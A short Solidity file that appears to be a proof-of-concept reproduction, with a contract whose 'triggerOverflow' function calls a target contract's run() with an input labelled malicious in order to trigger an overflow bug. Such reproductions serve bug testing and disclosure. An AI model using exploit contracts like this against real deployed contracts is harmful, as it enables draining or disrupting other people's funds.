interface IVulnerableContract {
    function run(uint256 input) external;
}

contract Reproduction {
    IVulnerableContract public target;

    constructor(address _target) {
        target = IVulnerableContract(_target);
    }

    function triggerOverflow() public {
        uint256 maliciousInput = 2; 
        target.run(maliciousInput);
    }
}